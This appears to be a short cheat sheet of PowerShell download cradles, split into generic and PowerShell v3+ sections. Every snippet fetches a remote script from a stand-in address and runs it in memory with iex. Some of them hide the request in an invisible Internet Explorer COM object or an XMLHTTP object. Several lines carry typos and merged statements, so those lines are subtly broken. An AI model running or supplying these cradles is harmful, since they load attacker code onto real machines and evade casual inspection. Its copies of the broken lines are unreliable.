```powershell
iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')

$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://10.0.0.1/payload.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

Powershell v3+
```powershell
iex (iwr 'http://10.0.0.1/payload.ps1')

$h=New-Object -ComObect Mscml2.XMLHTTP;$h.open('GET','http://10.0.0.1/payload.ps1', $false);$h.send();iex $h.responseText

wr = [System.Net.WebRequest]::Create("http://10.0.0.1/payload.ps1") 
$r = $wr.GetResponse() IEX([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```